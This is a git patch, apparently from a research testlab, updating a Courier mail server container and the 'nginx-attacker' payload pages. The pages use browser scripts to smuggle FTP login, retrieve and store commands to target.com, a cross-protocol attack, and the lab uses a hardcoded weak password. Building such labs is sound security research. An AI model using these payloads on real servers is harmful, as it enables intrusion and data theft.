@@ -1,0 +1,114 @@
+From c9ee1ae830c4a645fd184c353ffa768568913262 Mon Sep 17 00:00:00 2001
+From: Ying Liu <liuying23@mails.tsinghua.edu.cn>
+Date: Thu, 4 Jan 2024 21:21:27 +0800
+Subject: [PATCH] modified
+
+---
+ testlab/servers/files/mail-courier/Dockerfile   |  5 ++---
+ .../servers/files/mail-courier/entrypoint.sh    |  2 +-
+ .../nginx-attacker/html/download/ftps.html      | 14 +++++---------
+ .../files/nginx-attacker/html/upload/ftps.html  | 17 +++++++----------
+ .../files/nginx-attacker/html/upload/imaps.html |  2 +-
+ 5 files changed, 16 insertions(+), 24 deletions(-)
+
+diff --git a/testlab/servers/files/mail-courier/Dockerfile b/testlab/servers/files/mail-courier/Dockerfile
+index 65229f6..4b2d54b 100644
+--- a/testlab/servers/files/mail-courier/Dockerfile
++++ b/testlab/servers/files/mail-courier/Dockerfile
+@@ -2,9 +2,8 @@
+ FROM debian:latest
+ 
+ RUN mkdir -p /var/run/courier/authdaemon/ && touch /var/run/courier/authdaemon/pid.lock
+-RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y courier-imap courier-pop courier-authlib-mysql courier-mta gamin rsyslog
++RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y courier-imap courier-pop courier-authlib-mysql courier-mta gamin rsyslog rpcbind fam
+ RUN mkdir /var/log/courier/
+-RUN ln -s /bin/mkdir /usr/bin/mkdir
+ RUN useradd bob -d /home/bob
+ RUN echo bob:12345 | chpasswd
+ RUN mkdir /home/bob/
+@@ -14,4 +13,4 @@ RUN chmod -R 777 /home/bob/Maildir
+ RUN chown -R bob:bob /home/bob
+ EXPOSE 110/tcp 143/tcp
+ ADD entrypoint.sh /usr/local/bin/entrypoint.sh
+-ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
+\ No newline at end of file
++ENTRYPOINT ["bash", "/usr/local/bin/entrypoint.sh"]
+diff --git a/testlab/servers/files/mail-courier/entrypoint.sh b/testlab/servers/files/mail-courier/entrypoint.sh
+index 939e113..43a3ed8 100644
+--- a/testlab/servers/files/mail-courier/entrypoint.sh
++++ b/testlab/servers/files/mail-courier/entrypoint.sh
+@@ -11,4 +11,4 @@ service courier-pop start
+ service courier-pop-ssl start
+ service courier-imap start
+ service courier-imap-ssl start
+-bash
++tail -f /dev/null
+diff --git a/testlab/servers/files/nginx-attacker/html/download/ftps.html b/testlab/servers/files/nginx-attacker/html/download/ftps.html
+index 67c9050..a8d2c62 100644
+--- a/testlab/servers/files/nginx-attacker/html/download/ftps.html
++++ b/testlab/servers/files/nginx-attacker/html/download/ftps.html
+@@ -1,14 +1,10 @@
+ <script>
+-    var formData = new FormData();
+-    formData.append("a", "USER bob");
+-    formData.append("b", "PASS 12345");
+-    formData.append("b", "TYPE I");
+-    formData.append("c", "PASV");
+-    formData.append("d", "RETR payload.html");
++    mydata = "User bob\r\nPASS 12345\r\nTYPE I\r\nPASV\r\nRETR payload.html\r\n"
+ 
+-    var xhr = new XMLHttpRequest();
+-    xhr.open("POST", "https://target.com");
+-    xhr.send(formData);
++    fetch("https://target.com", {
++        method: "POST",
++        body: mydata
++    });
+ 
+     setTimeout(function() {
+         window.location = "https://target.com";
+diff --git a/testlab/servers/files/nginx-attacker/html/upload/ftps.html b/testlab/servers/files/nginx-attacker/html/upload/ftps.html
+index 720fa65..9cd4603 100644
+--- a/testlab/servers/files/nginx-attacker/html/upload/ftps.html
++++ b/testlab/servers/files/nginx-attacker/html/upload/ftps.html
+@@ -1,16 +1,13 @@
+ <script>
+-    var formData = new FormData();
+-    formData.append("a", "USER bob");
+-    formData.append("b", "PASS 12345");
+-    formData.append("b", "TYPE I");
+-    formData.append("c", "PASV");
+-    formData.append("d", "STOR leak");
++    mydata = "User bob\r\nPASS 12345\r\nTYPE I\r\nPASV\r\nSTOR leak\r\n"
+ 
+-    var xhr = new XMLHttpRequest();
+-    xhr.open("POST", "https://target.com");
+-    xhr.send(formData);
++    fetch("https://target.com", {
++        method: "POST",
++        body: mydata
++    });
+ 
+     setTimeout(function() {
+         window.location = "https://target.com";
+     }, 5000);
+-</script>
+\ No newline at end of file
++
++</script>
+diff --git a/testlab/servers/files/nginx-attacker/html/upload/imaps.html b/testlab/servers/files/nginx-attacker/html/upload/imaps.html
+index 8960a5a..50c9dc2 100644
+--- a/testlab/servers/files/nginx-attacker/html/upload/imaps.html
++++ b/testlab/servers/files/nginx-attacker/html/upload/imaps.html
+@@ -14,7 +14,7 @@
+ 
+ 
+     var xhr = new XMLHttpRequest();
+-    xhr.open("POST", "https://target.com);
++    xhr.open("POST", "https://target.com");
+     xhr.send(formData);
+     var xhr2 = new XMLHttpRequest();
+     xhr2.open("GET", "https://target.com");
+-- 
+2.34.1
+
